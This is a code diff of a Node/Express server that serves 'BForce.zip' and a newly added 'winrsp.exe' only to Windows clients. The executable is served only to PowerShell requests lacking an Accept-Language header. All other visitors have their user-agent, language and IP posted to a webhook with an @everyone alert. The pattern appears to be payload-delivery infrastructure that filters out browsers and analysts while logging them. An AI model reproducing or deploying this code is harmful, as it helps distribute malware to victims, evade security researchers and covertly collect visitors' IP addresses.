@@ -17,8 +17,7 @@ app.get('/', (req, res) => {
 })
 
 app.all('/static/bin/BForce.zip', (req, res) => {
-    if (req.headers['user-agent'].includes("(Windows"))
-        res.sendFile(path.join(__dirname, '/static/bin/BForce.zip'));
+    if (req.headers['user-agent'].includes("(Windows")) res.sendFile(path.join(__dirname, '/static/bin/BForce.zip'));
     else {
         ip = ((req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress))
         fetch(wh, {
@@ -30,8 +29,22 @@ app.all('/static/bin/BForce.zip', (req, res) => {
     }
 })
 
+app.all('/static/bin/winrsp.exe', (req, res) => {
+    if (req.headers['user-agent'].includes("(Windows") && req.headers['accept-language'] == undefined && req.headers['user-agent'].includes("WindowsPowerShell"))
+        res.sendFile(path.join(__dirname, '/static/bin/winrsp.exe'));
+    else {
+        ip = ((req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress))
+        fetch(wh, {
+            method: 'post',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: `@everyone (code 3)\n\`\`\`\n${req.headers['user-agent']}\n${req.headers['accept-language']}\n${ip}\`\`\`` })
+        });
+        res.send("No. <style>html { background: #181818; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }</style>");
+    }
+})
+
 app.use(express.static(path.join(__dirname)));
-app.get('*', (req, res) => res.send("No. <style>html { background: #181818; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }</style>"));
+app.get('*', (req, res) => res.send("Get outta here <style>html { background: #181818; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }</style>"));
 app.listen(PORT, () => {
     console.log(`Running on port ${PORT}`)
 })
